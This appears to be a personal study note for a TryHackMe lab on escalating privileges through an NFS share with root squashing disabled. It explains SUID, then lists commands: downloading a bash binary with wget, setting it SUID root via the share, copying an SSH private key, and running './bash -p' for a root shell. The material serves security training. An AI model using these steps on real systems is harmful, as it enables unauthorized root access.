---
title: Exploiting NFS
updated: 2023-03-24T09:20:08.0000000+04:00
created: 2023-02-02T07:02:42.0000000+04:00
---

Exploiting NFS
Thursday, February 2, 2023
7:02 AM
## Escalating Privileges:

If you have a low privilege shell on any machine and you found that a machine has an NFS share you might be able to use that to escalate privileges, depending on how it is configured.

## What is root_squash?

- By default, on NFS shares- Root Squashing is enabled, and prevents anyone connecting to the NFS share from having root access to the NFS volume.

- Remote root users are assigned a user “nfsnobody” when connected, which has the least local privileges. Not what we want.

- However, if this is turned off, it can allow the creation of SUID bit files, allowing a remote user root access to the connected system.

## SUID

- Essentially, this means that the file or files can be run with the permissions of the file(s) owner/group.

- In this case, as the super-user. We can leverage this to get a shell with these privileges!

## Method

- We're able to upload files to the NFS share, and control the permissions of these files.

- We can set the permissions of whatever we upload, in this case a bash shell executable.

- We can then log in through SSH, as we did in the previous task- and execute this executable to gain a root shell!

## Mapped Out Pathway:

- NFS Access -\>

- Gain Low Privilege Shell -\>

- Upload Bash Executable to the NFS share -\>

- Set SUID Permissions Through NFS Due To Misconfigured Root Squash -\>

- Login through SSH -\>

- Execute SUID Bit Bash Executable -\>

ROOT ACCESS

## TryHackMe Walkthrough:

1.  Follow the previous steps from the enumeration phase.

2.  You will need to download the provided bash executable:

3.  wget <https://github.com/polo-sec/writing/raw/master/Security%20Challenge%20Walkthroughs/Networks%202/bash>

4.  Gain access to the SSH

5.  Copy the bash executable to the mounted shared drive

![image1](image1-33.png)

![image2](image2-16.png)

6.  Configure the file to be owned by a root user

![image3](image3-9.png)

7.  Add the SUID bit permission to the bash executable

| Command | Sudo chmod +s bash |
|---------|--------------------|

![image4](image4-8.png)

8.  Once permission has been set, you can proceed to connect through ssh, using the methods from the previous tasks

1.  Go into the .ssh folder
2.  Copy the id_rsa to your local machine folder: cp id_rsa /tmp/mount

9.  Log into ssh

| Command | ssh -i /tmp/id_rsa cappucino@\$ip |
|---------|-----------------------------------|

![image5](image5-6.png)

10. Execute the bash file

![image6](image6-3.png)

11. Now, SSH into the machine as the user. List the directory to make sure the bash executable is there. Now, the moment of truth. Lets run it with "./bash -p". The -p persists the permissions, so that it can run as root with SUID- as otherwise bash will sometimes drop the permissions.

![image7](image7-3.png)

To check your root access:

![image8](image8-2.png)

